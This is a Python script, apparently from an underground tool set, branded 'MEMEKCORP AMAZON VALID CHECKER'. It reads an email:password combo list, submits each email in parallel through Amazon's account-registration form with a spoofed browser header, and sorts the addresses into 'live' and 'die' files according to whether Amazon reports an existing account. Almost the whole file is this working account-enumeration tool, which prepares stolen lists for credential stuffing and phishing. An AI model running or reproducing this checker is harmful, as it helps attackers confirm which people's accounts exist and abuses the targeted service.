from urllib.request import Request, urlopen
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import random
import time
import sourcedefender
from multiprocessing import Process
ua = UserAgent() # From here we generate a random user agent
import requests, re, sys
try:
    filelist = sys.argv[1]
except Exception as Err:
    print("ERROR : File List Not Found!")
    sys.exit()
list = open(filelist, "r")
count = 0
with open(filelist , 'r') as f:
    for line in f:
        count += 1
jumlah = 0
jumlahx = 0
loglive = open('amazon-live.txt','a')
logdie = open('amazon-die.txt','a')
jeda = 100
def worker2(email,jumjum):  
    
    

    link = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
    head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    jum = jumjum
    s = requests.session()
    g = s.get(link, headers=head)
    xxx = {'customerName':'memekcorp','email': email,'emailCheck': email,'password':'Memekcorp1','passwordCheck':'Memekcorp1'}
    cek = s.post(link, headers=head, data=xxx).text
    #print(cek)
    if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
        print(f"\033[30;1mMemekcorp Amazon\033[32;1mLIVE\033[0m {jum} / {count} : {email}")
        loglive = open('amazon-live.txt','a')
        loglive.write(email + '\n')
        loglive.close()
    else:
        print(f"\033[30;1mMemekcorp Amazon \033[31;1mDIE\033[0m {jum} / {count} : {email}")
        logdie = open('amazon-die.txt','a')
        logdie.write(email + '\n')
        logdie.close()
    #time.sleep(1)    
    
    
    

    

	
      # Choose a random proxy
if __name__ == "__main__":
    print("""
MEMEKCORP AMAZON VALID CHECKER 

       .\         MEMEKCORP         /
        .\        MEMEKCORP        /
         .\       MEMEKCORP       /
           ]                     [    ,'|
           ]                     [   /  |
           ]___               ___[ ,'   |
           ]  ]\             /[  [ |:   |
           ]  ] \           / [  [ |:   |
           ]  ]  ]         [  [  [ |:   |
           ]  ]  ]__     __[  [  [ |:   |
           ]  ]  ] ]\ _ /[ [  [  [ |:   |
           ]  ]  ] ] (#) [ [  [  [ :===='
           ]  ]  ]_].nHn.[_[  [  [
           ]  ]  ]  HHHHH. [  [  [
           ]  ] /   `HH("N  \ [  [
           ]__]/     HHH  "  \[__[
           ]         NNN         [
           ]         N/"         [
           ]         N H         [
          /          N            \.
         /           q,            \.
        /                           \.


""")
   
    
    procs = []
    while True:
        
        email = list.readline().replace("\n","")
        if not email:
            break
        
        split_string = email.split(':', 1)
        jumlah +=1
        jumlahx +=1


        if not email:
            break
        
        emailss = split_string[0]
        proc = Process(target=worker2, args=(emailss,jumlah,))
        procs.append(proc)
        proc.start()
        #time.sleep(1)

        email = list.readline().replace("\n","")
        split_string = email.split(':', 1)
        jumlah +=1
        jumlahx +=1


        if not email:
            break
        
        emailss = split_string[0]
        proc = Process(target=worker2, args=(emailss,jumlah,))
        procs.append(proc)
        proc.start()
        #time.sleep(1)
        #time.sleep(1)

        email = list.readline().replace("\n","")
        split_string = email.split(':', 1)
        jumlah +=1
        jumlahx +=1


        if not email:
            break
        
        emailss = split_string[0]
        proc = Process(target=worker2, args=(emailss,jumlah,))
        procs.append(proc)
        proc.start()
        #time.sleep(1)
    
        email = list.readline().replace("\n","")
        split_string = email.split(':', 1)
        jumlah +=1
        jumlahx +=1


        if not email:
            break
        
        emailss = split_string[0]
        proc = Process(target=worker2, args=(emailss,jumlah,))
        procs.append(proc)
        proc.start()
        #time.sleep(1)
    
        email = list.readline().replace("\n","")
        split_string = email.split(':', 1)
        jumlah +=1
        jumlahx +=1


        if not email:
            break
        
        emailss = split_string[0]
        proc = Process(target=worker2, args=(emailss,jumlah,))
        procs.append(proc)
        proc.start()
        #time.sleep(1)

    
        email = list.readline().replace("\n","")
        split_string = email.split(':', 1)
        jumlah +=1
        jumlahx +=1

        if not email:
            break
        
        emailss = split_string[0]
        proc = Process(target=worker2, args=(emailss,jumlah,))
        procs.append(proc)
        proc.start()
        #time.sleep(1)
    
        if jumlahx == 100:
            time.sleep(3)
            jumlahx=0
      

      # complete the processes

        for proc in procs:
            
            proc.join()    
            
           
    
    
 
    